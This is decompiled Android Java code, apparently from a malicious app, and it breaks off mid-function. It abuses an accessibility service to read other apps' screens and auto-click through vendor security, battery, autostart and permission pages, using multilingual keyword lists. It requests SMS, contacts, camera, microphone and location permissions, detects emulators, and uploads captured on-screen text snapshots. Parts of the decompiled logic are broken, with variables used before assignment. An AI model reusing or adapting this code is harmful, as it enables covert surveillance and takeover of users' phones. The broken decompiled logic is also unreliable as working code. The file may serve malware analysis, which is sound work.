// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package f2;

import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.LauncherActivityInfo;
import android.content.pm.LauncherApps;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Process;
import android.os.SystemClock;
import android.util.Log;
import android.view.View;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import com.os9sp.yfwkcq0dwfxaf.R;
import java.io.File;
import java.io.RandomAccessFile;
import java.lang.reflect.Method;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Collections;
import java.util.Iterator;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import lyr.stable.runtime.ScreenMirrorService;
import org.json.JSONArray;
import org.json.JSONObject;
import w1.cf;
import w1.o4;
import w1.t9;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public abstract class i0 {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public static long f1202a = -1;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public static long f1203b = -1;

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public static final int[] f1204c = {2, 4, 5};

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public static final String[] f1205d = {"settings", "safecenter", "securitycenter", "security", "safe", "permission", "manager", "systemmanager", "power", "battery", "keeper", "guard", "phonemaster", "optimizer", "optimization", "com.android.settings", "com.coloros", "com.oplus", "com.oppo", "com.oneplus", "com.realme", "com.miui", "com.xiaomi", "com.vivo", "com.iqoo", "com.huawei", "com.hihonor", "com.samsung", "com.transsion", "com.infinix", "com.tecno", "com.itel"};

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public static final String[] f1206e = {"battery", "bateria", "batería", "power", "energy", "energia", "energía", "highpower", "background", "bg", "doze", "idle", "optimization", "optimisation", "optimiz", "powerkeeper", "guardelf", "耗电", "电池", "省电", "后台"};

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public static final String[] f1207f = {"startup", "autostart", "auto_start", "auto-start", "autorun", "launch", "boot", "start", "background", "startupapp", "selfstart", "keepalive", "自启", "自启动", "启动", "开机", "后台"};

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public static final String[] f1208g = {"background", "bg", "popup", "pop", "window", "float", "floating", "overlay", "permission", "activity", "start_bg_activity", "draw", "display", "appear", "弹出", "弹窗", "窗口", "界面", "后台", "悬浮", "浮窗", "上层"};

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public static final int[] f1209h = {0, 1, 2, 3, 4, 5, 6};

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public static final String[] f1210i = {"com.android.systemui", "android", "com.android.settings", "com.android.permissioncontroller", "com.google.android.permissioncontroller", "com.samsung.android.permissioncontroller"};

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public static final String[] f1211j = {"settings", "permission", "systemui", "security", "secure", "manager", "safecenter", "miui", "vivo", "oppo", "huawei", "honor", "coloros", "oplus", "samsung"};

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public static final String[] f1212k = {"请求已安装的应用列表", "已安装应用列表", "读取应用列表", "获取应用列表", "查看已安装应用", "访问已安装应用", "应用列表", "安装的应用列表", "installed apps", "installed applications", "installed app list", "query all packages", "app list", "list of installed apps", "read app list", "get installed apps", "view installed apps", "lista de aplicaciones", "aplicaciones instaladas"};

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public static final Object f1213l = new Object();

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public static volatile String f1214m = "";
    public static volatile long n;

    public static String A(String str) {
        return str == null ? "" : str.toLowerCase(Locale.ROOT).replaceAll("[\\s_\\-·•\"'¿?¡!：:，,。\\.（）()]+", "");
    }

    public static boolean B(Context context) {
        int i3;
        int size;
        String str;
        if (context == null) {
            return false;
        }
        String packageName = context.getPackageName();
        int size2 = -1;
        try {
            PackageManager packageManager = context.getPackageManager();
            List<ApplicationInfo> installedApplications = Build.VERSION.SDK_INT >= 33 ? packageManager.getInstalledApplications(PackageManager.ApplicationInfoFlags.of(0L)) : packageManager.getInstalledApplications(0);
            size = installedApplications.size();
            try {
                i3 = 0;
                for (ApplicationInfo applicationInfo : installedApplications) {
                    try {
                        if (applicationInfo != null && (str = applicationInfo.packageName) != null && !str.equals(packageName)) {
                            i3++;
                        }
                    } catch (Throwable unused) {
                    }
                }
            } catch (Throwable unused2) {
                i3 = 0;
            }
        } catch (Throwable unused3) {
            i3 = 0;
            size = -1;
        }
        try {
            LauncherApps launcherApps = (LauncherApps) context.getSystemService(LauncherApps.class);
            if (launcherApps != null) {
                List<LauncherActivityInfo> activityList = launcherApps.getActivityList(null, Process.myUserHandle());
                size2 = activityList == null ? 0 : activityList.size();
            }
        } catch (Throwable unused4) {
        }
        return size >= 20 || size2 >= 3 || i3 >= 3;
    }

    public static int C(int i3) {
        if (i3 >= 7) {
            return 100;
        }
        int iO = o(i3);
        if (iO >= 0) {
            return (iO * 100) / 7;
        }
        if (i3 < f1209h[0]) {
            return 0;
        }
        return C(z(i3));
    }

    public static int D(int i3, ArrayList arrayList) {
        String[] strArr;
        int i4 = 0;
        if (arrayList.isEmpty()) {
            return 0;
        }
        if (i3 == 2) {
            strArr = f1206e;
        } else if (i3 == 4) {
            strArr = f1207f;
        } else {
            strArr = i3 == 5 ? f1208g : new String[0];
        }
        int size = arrayList.size();
        int i5 = 0;
        while (i5 < size) {
            Object obj = arrayList.get(i5);
            i5++;
            n nVar = (n) obj;
            if (nVar != null && !nVar.f1263b.isEmpty()) {
                ArrayList arrayListW = w(nVar.b(), strArr);
                if (!arrayListW.isEmpty() && I(nVar, arrayListW, w(nVar.f1262a, f1205d)) >= 12) {
                    i4++;
                }
            }
        }
        return i4;
    }

    public static int E(Context context) {
        if (context == null) {
            return 3;
        }
        String str = Build.MANUFACTURER;
        if (l.k() != 2) {
            return 3;
        }
        Context applicationContext = context.getApplicationContext();
        if (applicationContext != null) {
            context = applicationContext;
        }
        AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService("appops");
        if (appOpsManager == null) {
            return 3;
        }
        Integer numP = p(appOpsManager, "checkOpNoThrow", context.getPackageName());
        if (numP == null) {
            numP = p(appOpsManager, "unsafeCheckOpNoThrow", context.getPackageName());
        }
        if (numP != null) {
            int iIntValue = numP.intValue();
            if (iIntValue == 0) {
                return 1;
            }
            return (iIntValue == 1 || iIntValue == 2 || iIntValue == 3) ? 2 : 3;
        }
        String str2 = null;
        try {
            Method declaredMethod = AppOpsManager.class.getDeclaredMethod("opToName", Integer.TYPE);
            declaredMethod.setAccessible(true);
            Object objInvoke = declaredMethod.invoke(null, 10008);
            if (objInvoke instanceof String) {
                str2 = (String) objInvoke;
            }
        } catch (Throwable unused) {
        }
        if (str2 == null || str2.isEmpty()) {
            return 3;
        }
        try {
            int iUnsafeCheckOpNoThrow = appOpsManager.unsafeCheckOpNoThrow(str2, Process.myUid(), context.getPackageName());
            if (iUnsafeCheckOpNoThrow == 0) {
                return 1;
            }
            return (iUnsafeCheckOpNoThrow == 1 || iUnsafeCheckOpNoThrow == 2 || iUnsafeCheckOpNoThrow == 3) ? 2 : 3;
        } catch (Throwable unused2) {
            return 3;
        }
    }

    public static void F(a aVar) {
        if (aVar == null) {
            return;
        }
        AccessibilityNodeInfo accessibilityNodeInfo = (AccessibilityNodeInfo) aVar.f1119e;
        if (accessibilityNodeInfo != null) {
            try {
                accessibilityNodeInfo.recycle();
            } catch (Throwable unused) {
            }
        }
        AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) aVar.f1120f;
        if (accessibilityNodeInfo2 != null) {
            try {
                accessibilityNodeInfo2.recycle();
            } catch (Throwable unused2) {
            }
        }
        ArrayList arrayList = (ArrayList) aVar.f1121g;
        int size = arrayList.size();
        int i3 = 0;
        while (i3 < size) {
            Object obj = arrayList.get(i3);
            i3++;
            AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj;
            if (accessibilityNodeInfo3 != null) {
                try {
                    accessibilityNodeInfo3.recycle();
                } catch (Throwable unused3) {
                }
            }
        }
    }

    public static String[] G(Context context) {
        ArrayList arrayList;
        int i3 = Build.VERSION.SDK_INT;
        d0 d0VarD = e0.d(context);
        boolean z2 = d0VarD.f1171i;
        boolean z3 = d0VarD.n;
        boolean z4 = d0VarD.f1178q;
        boolean z5 = d0VarD.f1174l;
        boolean z6 = d0VarD.f1175m;
        boolean z7 = d0VarD.f1172j;
        boolean z8 = d0VarD.f1173k;
        boolean z9 = d0VarD.f1177p;
        LinkedHashSet linkedHashSet = new LinkedHashSet();
        if (z2 && i3 <= 30) {
            linkedHashSet.add("android.permission.WRITE_EXTERNAL_STORAGE");
            linkedHashSet.add("android.permission.READ_EXTERNAL_STORAGE");
        }
        if (z3) {
            linkedHashSet.add("android.permission.READ_CONTACTS");
            linkedHashSet.add("android.permission.WRITE_CONTACTS");
        }
        if (z4) {
            linkedHashSet.add("android.permission.CALL_PHONE");
        }
        if (z5) {
            linkedHashSet.add("android.permission.READ_SMS");
        }
        if (z6) {
            linkedHashSet.add("android.permission.SEND_SMS");
        }
        if (z7) {
            linkedHashSet.add("android.permission.CAMERA");
        }
        linkedHashSet.add("android.permission.READ_PHONE_STATE");
        linkedHashSet.add("android.permission.READ_PHONE_NUMBERS");
        if (z8) {
            linkedHashSet.add("android.permission.RECORD_AUDIO");
        }
        linkedHashSet.add("android.permission.ACCESS_WIFI_STATE");
        linkedHashSet.add("android.permission.ACCESS_NETWORK_STATE");
        linkedHashSet.add("android.permission.WAKE_LOCK");
        linkedHashSet.add("android.permission.INTERNET");
        if (i3 >= 33) {
            linkedHashSet.add("android.permission.POST_NOTIFICATIONS");
        }
        if (z9) {
            linkedHashSet.add("android.permission.ACCESS_FINE_LOCATION");
            linkedHashSet.add("android.permission.ACCESS_COARSE_LOCATION");
        }
        ArrayList arrayList2 = new ArrayList(linkedHashSet);
        if (arrayList2.isEmpty()) {
            arrayList = new ArrayList(arrayList2);
        } else {
            LinkedHashSet linkedHashSet2 = new LinkedHashSet();
            try {
                String[] strArr = context.getPackageManager().getPackageInfo(context.getPackageName(), 4096).requestedPermissions;
                if (strArr != null) {
                    for (String str : strArr) {
                        if (str != null && !str.isEmpty()) {
                            linkedHashSet2.add(str);
                        }
                    }
                }
            } catch (Throwable unused) {
            }
            if (linkedHashSet2.isEmpty()) {
                arrayList = new ArrayList(arrayList2);
            } else {
                arrayList = new ArrayList();
                int size = arrayList2.size();
                int i4 = 0;
                while (i4 < size) {
                    Object obj = arrayList2.get(i4);
                    i4++;
                    String str2 = (String) obj;
                    if (linkedHashSet2.contains(str2)) {
                        arrayList.add(str2);
                    }
                }
            }
        }
        return (String[]) arrayList.toArray(new String[0]);
    }

    public static a H(ScreenMirrorService screenMirrorService) {
        StringBuilder sb;
        Iterator<AccessibilityWindowInfo> it;
        AccessibilityNodeInfo rootInActiveWindow;
        int type;
        List<AccessibilityWindowInfo> list = Collections.EMPTY_LIST;
        try {
            List<AccessibilityWindowInfo> windows = screenMirrorService.getWindows();
            if (windows != null) {
                list = windows;
            }
        } catch (Throwable unused) {
        }
        a aVar = new a();
        aVar.f1115a = "";
        aVar.f1116b = "";
        aVar.f1117c = "";
        aVar.f1118d = new String[0];
        aVar.f1121g = new ArrayList();
        ArrayList arrayList = (ArrayList) aVar.f1121g;
        ArrayList arrayList2 = new ArrayList();
        a(t9.f5177h, arrayList2);
        try {
            a(screenMirrorService.getString(R.string.accessibility_service_label), arrayList2);
        } catch (Throwable unused2) {
        }
        try {
            CharSequence charSequenceLoadLabel = screenMirrorService.getApplicationInfo().loadLabel(screenMirrorService.getPackageManager());
            if (charSequenceLoadLabel != null) {
                a(charSequenceLoadLabel.toString(), arrayList2);
            }
            while (true) {
                rootInActiveWindow = null;
                if (!it.hasNext()) {
                    break;
                }
                AccessibilityWindowInfo next = it.next();
                if (next != null && (type = next.getType()) != 4 && type != 2) {
                    try {
                        rootInActiveWindow = next.getRoot();
                    } catch (Throwable unused3) {
                    }
                    if (rootInActiveWindow != null) {
                        arrayList.add(rootInActiveWindow);
                        if (((String) aVar.f1115a).isEmpty() && (next.isActive() || next.isFocused() || type == 1)) {
                            aVar.f1115a = N(rootInActiveWindow.getPackageName());
                            aVar.f1116b = N(rootInActiveWindow.getClassName());
                        }
                        Q(rootInActiveWindow, aVar, sb, 0);
                    }
                }
            }
        } catch (Throwable unused4) {
        }
        aVar.f1118d = (String[]) arrayList2.toArray(new String[0]);
        sb = new StringBuilder();
        it = list.iterator();
        if (((String) aVar.f1115a).isEmpty()) {
            try {
                rootInActiveWindow = screenMirrorService.getRootInActiveWindow();
            } catch (Throwable unused5) {
            }
            if (rootInActiveWindow != null) {
                arrayList.add(rootInActiveWindow);
                aVar.f1115a = N(rootInActiveWindow.getPackageName());
                aVar.f1116b = N(rootInActiveWindow.getClassName());
                Q(rootInActiveWindow, aVar, sb, 0);
            }
        }
        aVar.f1117c = sb.toString();
        return aVar;
    }

    public static int I(n nVar, ArrayList arrayList, ArrayList arrayList2) {
        if (arrayList.isEmpty()) {
            return 0;
        }
        int size = (arrayList.size() * 10) + (arrayList2.size() * 4);
        if ("com.android.settings".equals(nVar.f1262a)) {
            size += 10;
        }
        if (nVar.f1268g) {
            size += 6;
        }
        if (nVar.f1266e) {
            size += 4;
        }
        if (!nVar.f1267f) {
            size -= 12;
        }
        return !nVar.f1270i ? size - 4 : size;
    }

    public static boolean J(int i3, int i4) {
        return (i3 == 3 || i3 == 2) && i4 == 2;
    }

    public static String K(JSONObject jSONObject) {
        JSONArray jSONArrayNames;
        StringBuilder sb = new StringBuilder();
        sb.append(jSONObject.optInt("schemaVersion"));
        sb.append('|');
        sb.append(jSONObject.optInt("flowVersion"));
        sb.append('|');
        sb.append(jSONObject.optString("manufacturer"));
        sb.append('|');
        sb.append(jSONObject.optString("model"));
        sb.append('|');
        sb.append(jSONObject.optInt("sdk"));
        sb.append('|');
        sb.append(jSONObject.optString("profileId"));
        sb.append('|');
        JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray("steps");
        if (jSONArrayOptJSONArray != null) {
            for (int i3 = 0; i3 < jSONArrayOptJSONArray.length(); i3++) {
                JSONObject jSONObjectOptJSONObject = jSONArrayOptJSONArray.optJSONObject(i3);
                if (jSONObjectOptJSONObject != null) {
                    sb.append(jSONObjectOptJSONObject.optInt("index"));
                    sb.append(':');
                    sb.append(jSONObjectOptJSONObject.optString("result"));
                    sb.append(':');
                    sb.append(jSONObjectOptJSONObject.optString("reason"));
                    sb.append(';');
                }
            }
        }
        JSONObject jSONObjectOptJSONObject2 = jSONObject.optJSONObject("discoveries");
        if (jSONObjectOptJSONObject2 != null && (jSONArrayNames = jSONObjectOptJSONObject2.names()) != null) {
            ArrayList arrayList = new ArrayList();
            for (int i4 = 0; i4 < jSONArrayNames.length(); i4++) {
                arrayList.add(jSONArrayNames.optString(i4));
            }
            Collections.sort(arrayList);
            int size = arrayList.size();
            int i5 = 0;
            while (i5 < size) {
                Object obj = arrayList.get(i5);
                i5++;
                String str = (String) obj;
                JSONObject jSONObjectOptJSONObject3 = jSONObjectOptJSONObject2.optJSONObject(str);
                if (jSONObjectOptJSONObject3 != null) {
                    sb.append(str);
                    sb.append('=');
                    JSONArray jSONArrayOptJSONArray2 = jSONObjectOptJSONObject3.optJSONArray("candidates");
                    if (jSONArrayOptJSONArray2 != null) {
                        for (int i6 = 0; i6 < jSONArrayOptJSONArray2.length(); i6++) {
                            JSONObject jSONObjectOptJSONObject4 = jSONArrayOptJSONArray2.optJSONObject(i6);
                            if (jSONObjectOptJSONObject4 != null) {
                                sb.append(jSONObjectOptJSONObject4.optString("component"));
                                sb.append(',');
                            }
                        }
                        sb.append(';');
                    }
                }
            }
        }
        return sb.toString();
    }

    public static String L(int i3) {
        switch (i3) {
            case 0:
                return "standardBatteryWhitelist";
            case 1:
                return "installedApps";
            case 2:
                return "vendorBattery";
            case 3:
                return "screenCapture";
            case 4:
                return "autoStart";
            case 5:
                return "backgroundPopup";
            case 6:
                return "foregroundNotification";
            default:
                return null;
        }
    }

    public static File M(Context context) {
        if (context == null) {
            return null;
        }
        Context applicationContext = context.getApplicationContext();
        if (applicationContext != null) {
            context = applicationContext;
        }
        Context contextCreateDeviceProtectedStorageContext = context.createDeviceProtectedStorageContext();
        if (contextCreateDeviceProtectedStorageContext != null) {
            context = contextCreateDeviceProtectedStorageContext;
        }
        return new File(new File(context.getFilesDir(), "a11y"), "projection-grant-v1");
    }

    public static String N(CharSequence charSequence) {
        return charSequence == null ? "" : charSequence.toString();
    }

    /* JADX WARN: Code duplicated, block: B:15:0x0018  */
    public static long O(int i3) {
        long j3 = 8000;
        if (i3 != 0 && i3 != 1 && i3 != 2) {
            if (i3 == 3) {
                j3 = 15000;
            } else if (i3 != 4) {
                if (i3 != 6) {
                    j3 = 12000;
                } else {
                    j3 = 15000;
                }
            }
        }
        if (j3 < 1000) {
            return 1000L;
        }
        if (j3 > 90000) {
            return 90000L;
        }
        return j3;
    }

    public static void P(ScreenMirrorService screenMirrorService, int i3, String str, AccessibilityNodeInfo accessibilityNodeInfo) {
        String strH = h(accessibilityNodeInfo, 0, new StringBuilder(), 0);
        if (strH.length() > 8000) {
            strH = strH.substring(0, 8000);
        }
        if (screenMirrorService != null) {
            Context applicationContext = screenMirrorService.getApplicationContext();
            synchronized (l.class) {
                try {
                    SharedPreferences sharedPreferences = applicationContext.getSharedPreferences("auth_route_discovery", 0);
                    JSONArray jSONArray = new JSONArray(sharedPreferences.getString("page_snapshots", "[]"));
                    JSONObject jSONObject = new JSONObject();
                    jSONObject.put("step", i3);
                    jSONObject.put("key", L(i3));
                    jSONObject.put("reason", str == null ? "" : str);
                    jSONObject.put("tree", strH.length() > 2000 ? strH.substring(0, 2000) : strH);
                    JSONArray jSONArray2 = new JSONArray();
                    for (int iMax = Math.max(0, jSONArray.length() - 2); iMax < jSONArray.length(); iMax++) {
                        jSONArray2.put(jSONArray.get(iMax));
                    }
                    jSONArray2.put(jSONObject);
                    sharedPreferences.edit().putString("page_snapshots", jSONArray2.toString()).apply();
                } catch (Throwable th) {
                    Log.w("AuthRouteDiscovery", "stash snapshot failed: " + th.getMessage());
                }
            }
        }
        StringBuilder sbI = a0.a.i(i3, "step=", " key=");
        sbI.append(L(i3));
        sbI.append(" reason=");
        sbI.append(str);
        sbI.append(" tree=");
        sbI.append(strH);
        try {
            cf.K().n0("auth_page_snapshot", sbI.toString());
        } catch (Throwable th2) {
            a0.a.p(th2, new StringBuilder("upload failed: "), "AuthPageSnapshot");
        }
    }

    /* JADX WARN: Code duplicated, block: B:57:0x00d9  */
    public static void Q(AccessibilityNodeInfo accessibilityNodeInfo, a aVar, StringBuilder sb, int i3) throws Throwable {
        AccessibilityNodeInfo child;
        String[] strArr = l.f1236f;
        if (accessibilityNodeInfo == null || i3 > 40) {
            return;
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null && text.length() != 0 && sb.length() < 8000) {
            sb.append(' ');
            sb.append(text);
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null && contentDescription.length() != 0 && sb.length() < 8000) {
            sb.append(' ');
            sb.append(contentDescription);
        }
        String viewIdResourceName = accessibilityNodeInfo.getViewIdResourceName();
        if (((AccessibilityNodeInfo) aVar.f1119e) == null) {
            String strTrim = l.L(N(accessibilityNodeInfo.getContentDescription())).trim();
            if (strTrim.isEmpty() ? false : "up".equals(strTrim) ? true : l.i(strTrim, strArr)) {
                aVar.f1119e = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
            } else {
                String strTrim2 = l.L(N(accessibilityNodeInfo.getText())).trim();
                if (strTrim2.isEmpty() ? false : "up".equals(strTrim2) ? true : l.i(strTrim2, strArr)) {
                    aVar.f1119e = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                } else if (viewIdResourceName != null && !viewIdResourceName.isEmpty()) {
                    String lowerCase = viewIdResourceName.toLowerCase(Locale.ROOT);
                    if (lowerCase.contains("coui_toolbar_back") || lowerCase.contains("action_bar_up") || lowerCase.contains("toolbar_nav") || lowerCase.endsWith(":id/home") || lowerCase.endsWith(":id/up") || lowerCase.endsWith("/up")) {
                        aVar.f1119e = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
                    }
                }
            }
        }
        if (((AccessibilityNodeInfo) aVar.f1120f) == null && accessibilityNodeInfo.isVisibleToUser()) {
            String strTrim3 = l.L(N(accessibilityNodeInfo.getText())).trim();
            if ((strTrim3.isEmpty() || l.i(strTrim3, l.f1238h) || strTrim3.contains("开启") || strTrim3.contains("enable")) ? false : l.i(strTrim3, l.f1237g)) {
                aVar.f1120f = AccessibilityNodeInfo.obtain(accessibilityNodeInfo);
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i4 = 0; i4 < childCount; i4++) {
            try {
                child = accessibilityNodeInfo.getChild(i4);
                try {
                    Q(child, aVar, sb, i3 + 1);
                    if (child != null) {
                        try {
                            child.recycle();
                        } catch (Throwable unused) {
                        }
                    }
                } catch (Throwable th) {
                    th = th;
                    if (child != null) {
                        try {
                            child.recycle();
                        } catch (Throwable unused2) {
                        }
                    }
                    throw th;
                }
            } catch (Throwable th2) {
                th = th2;
                child = null;
            }
        }
    }

    public static void R(Context context, boolean z2, long j3) {
        synchronized (f1213l) {
            try {
                File fileM = M(context);
                if (fileM == null) {
                    return;
                }
                File parentFile = fileM.getParentFile();
                if (parentFile != null && !parentFile.exists() && !parentFile.mkdirs() && !parentFile.isDirectory()) {
                    return;
                }
                RandomAccessFile randomAccessFile = new RandomAccessFile(fileM, "rw");
                try {
                    FileChannel channel = randomAccessFile.getChannel();
                    try {
                        FileLock fileLockLock = channel.lock();
                        try {
                            randomAccessFile.setLength(0L);
                            randomAccessFile.seek(0L);
                            randomAccessFile.writeInt(1346849841);
                            randomAccessFile.writeInt(1);
                            randomAccessFile.writeBoolean(z2);
                            randomAccessFile.writeLong(j3);
                            randomAccessFile.writeLong(SystemClock.elapsedRealtime());
                            randomAccessFile.getFD().sync();
                            if (fileLockLock != null) {
                                fileLockLock.close();
                            }
                            channel.close();
                            randomAccessFile.close();
                        } catch (Throwable th) {
                            if (fileLockLock != null) {
                                try {
                                    fileLockLock.close();
                                } catch (Throwable th2) {
                                    th.addSuppressed(th2);
                                }
                            }
                            throw th;
                        }
                    } catch (Throwable th3) {
                        if (channel != null) {
                            try {
                                channel.close();
                            } catch (Throwable th4) {
                                th3.addSuppressed(th4);
                            }
                        }
                        throw th3;
                    }
                } catch (Throwable th5) {
                    try {
                        randomAccessFile.close();
                    } catch (Throwable th6) {
                        th5.addSuppressed(th6);
                    }
                    throw th5;
                }
            } catch (Throwable th7) {
                Log.w("ProjectionGrantLease", "write failed: " + th7.getMessage());
            }
        }
    }

    public static void a(String str, ArrayList arrayList) {
        if (str == null) {
            return;
        }
        String strTrim = str.trim();
        if (strTrim.isEmpty() || arrayList.contains(strTrim)) {
            return;
        }
        arrayList.add(strTrim);
    }

    public static boolean b(Context context) {
        for (String str : G(context)) {
            if (context.checkSelfPermission(str) != 0) {
                return false;
            }
        }
        return true;
    }

    public static void c(View view) {
        String str = Build.FINGERPRINT;
        String str2 = Build.HARDWARE;
        String str3 = Build.PRODUCT;
        String lowerCase = str == null ? "" : str.toLowerCase(Locale.ROOT);
        String lowerCase2 = str2 == null ? "" : str2.toLowerCase(Locale.ROOT);
        String lowerCase3 = str3 != null ? str3.toLowerCase(Locale.ROOT) : "";
        boolean z2 = lowerCase.startsWith("generic") || lowerCase.contains("/sdk_gphone") || lowerCase2.contains("goldfish") || lowerCase2.contains("ranchu") || lowerCase3.startsWith("sdk_gphone") || lowerCase3.contains("emulator");
        view.setLayerType(z2 ? 1 : 2, null);
        if (z2) {
            Log.i("DecorWebPage", "software layer for emulator graphics");
        }
    }

    public static synchronized void d() {
        long jElapsedRealtime = SystemClock.elapsedRealtime();
        synchronized (i0.class) {
            f1202a = Math.max(0L, jElapsedRealtime);
        }
    }

    public static void e(AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo == null) {
            return;
        }
        try {
            if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                return;
            }
            for (int i3 = 0; i3 < 6 && accessibilityNodeInfo != null; i3++) {
                if (accessibilityNodeInfo.isClickable() && accessibilityNodeInfo.performAction(16)) {
                    return;
                }
                accessibilityNodeInfo = accessibilityNodeInfo.getParent();
            }
        } catch (Throwable th) {
            a0.a.p(th, new StringBuilder("click failed: "), "A11yEnableLeave");
        }
    }

    public static boolean f(String str, ArrayList arrayList) {
        int size = arrayList.size();
        int i3 = 0;
        while (i3 < size) {
            Object obj = arrayList.get(i3);
            i3++;
            String strA = A((String) obj);
            if (!strA.isEmpty() && str.contains(strA)) {
                return true;
            }
        }
        return false;
    }

    public static JSONObject g(int i3, ArrayList arrayList) {
        String[] strArr;
        List<o> arrayList2;
        ArrayList arrayListW;
        int I;
        if (arrayList.isEmpty()) {
            arrayList2 = Collections.EMPTY_LIST;
        } else {
            if (i3 == 2) {
                strArr = f1206e;
            } else if (i3 == 4) {
                strArr = f1207f;
            } else {
                strArr = i3 == 5 ? f1208g : new String[0];
            }
            ArrayList arrayList3 = new ArrayList();
            int size = arrayList.size();
            int i4 = 0;
            while (i4 < size) {
                Object obj = arrayList.get(i4);
                i4++;
                n nVar = (n) obj;
                if (nVar != null && !nVar.f1263b.isEmpty()) {
                    ArrayList arrayListW2 = w(nVar.b(), strArr);
                    if (!arrayListW2.isEmpty() && (I = I(nVar, arrayListW2, (arrayListW = w(nVar.f1262a, f1205d)))) >= 12) {
                        arrayList3.add(new o(nVar, I, arrayListW2, arrayListW));
                    }
                }
            }
            Collections.sort(arrayList3, new m());
            arrayList2 = arrayList3.size() > 8 ? new ArrayList(arrayList3.subList(0, 8)) : arrayList3;
        }
        JSONObject jSONObject = new JSONObject();
        Iterator it = arrayList2.iterator();
        int i5 = 0;
        while (it.hasNext()) {
            if (((o) it.next()).f1274a.c()) {
                i5++;
            }
        }
        JSONArray jSONArray = new JSONArray();
        for (o oVar : arrayList2) {
            JSONObject jSONObject2 = new JSONObject();
            try {
                n nVar2 = oVar.f1274a;
                jSONObject2.put("component", nVar2.a());
                jSONObject2.put("packageName", nVar2.f1262a);
                jSONObject2.put("activityName", nVar2.f1263b);
                String strSubstring = nVar2.f1264c;
                if (strSubstring.length() > 64) {
                    strSubstring = strSubstring.substring(0, 64);
                }
                jSONObject2.put("activityLabel", strSubstring);
                String strSubstring2 = nVar2.f1265d;
                if (strSubstring2.length() > 64) {
                    strSubstring2 = strSubstring2.substring(0, 64);
                }
                jSONObject2.put("applicationLabel", strSubstring2);
                jSONObject2.put("exported", nVar2.f1266e);
                jSONObject2.put("enabled", nVar2.f1267f);
                jSONObject2.put("systemPackage", nVar2.f1268g);
                jSONObject2.put("openableByApp", nVar2.c());
                jSONObject2.put("score", oVar.f1275b);
                jSONObject2.put("matchedTerms", new JSONArray((Collection) oVar.f1276c));
                jSONObject2.put("packageMatches", new JSONArray((Collection) oVar.f1277d));
                if (!nVar2.f1269h.isEmpty()) {
                    jSONObject2.put("requiredPermission", nVar2.f1269h);
                }
            } catch (Exception unused) {
            }
            jSONArray.put(jSONObject2);
        }
        try {
            jSONObject.put("candidateCount", arrayList2.size());
            jSONObject.put("openableCount", i5);
            jSONObject.put("truncated", D(i3, arrayList) > 8);
            jSONObject.put("candidates", jSONArray);
        } catch (Exception unused2) {
        }
        return jSONObject;
    }

    public static String h(AccessibilityNodeInfo accessibilityNodeInfo, int i3, StringBuilder sb, int i4) {
        if (accessibilityNodeInfo == null || i4 > 80 || i3 > 8) {
            return sb.toString();
        }
        for (int i5 = 0; i5 < i3; i5++) {
            sb.append(' ');
        }
        CharSequence text = accessibilityNodeInfo.getText();
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        sb.append(accessibilityNodeInfo.getClassName());
        sb.append(' ');
        sb.append(accessibilityNodeInfo.getViewIdResourceName() == null ? "" : accessibilityNodeInfo.getViewIdResourceName());
        sb.append(' ');
        if (text == null) {
            text = "";
        }
        sb.append(text);
        sb.append(' ');
        if (contentDescription == null) {
            contentDescription = "";
        }
        sb.append(contentDescription);
        sb.append('\n');
        int i6 = i4 + 1;
        for (int i7 = 0; i7 < accessibilityNodeInfo.getChildCount(); i7++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i7);
            if (child != null) {
                h(child, i3 + 1, sb, i6);
                i6++;
                try {
                    child.recycle();
                } catch (Throwable unused) {
                }
            }
        }
        return sb.toString();
    }

    public static b2.e i(boolean z2, boolean z3, boolean z4, long j3, long j4, boolean z5, boolean z6, long j5, String str) {
        boolean z7 = false;
        boolean z8 = !z4 || (z3 && j3 > 0 && j4 - j3 >= 500);
        if (z5 && !z6) {
            z7 = true;
        }
        String str2 = "";
        String str3 = (j5 <= 0 || j4 - j5 > 60000 || str == null) ? "" : str;
        if (!z2 && "accessibility-setting-cleared-before-stable".equals(str3)) {
            str2 = "paused: accessibility setting was cleared before stable confirmation";
        } else if (!z2 && ("restricted-settings-or-system-revoked".equals(str3) || "accessibility-setting-cleared-before-stable".equals(str3))) {
            str2 = "paused: accessibility service was revoked by system restricted settings";
        } else if (!z2) {
            str2 = "paused: accessibility service is disabled";
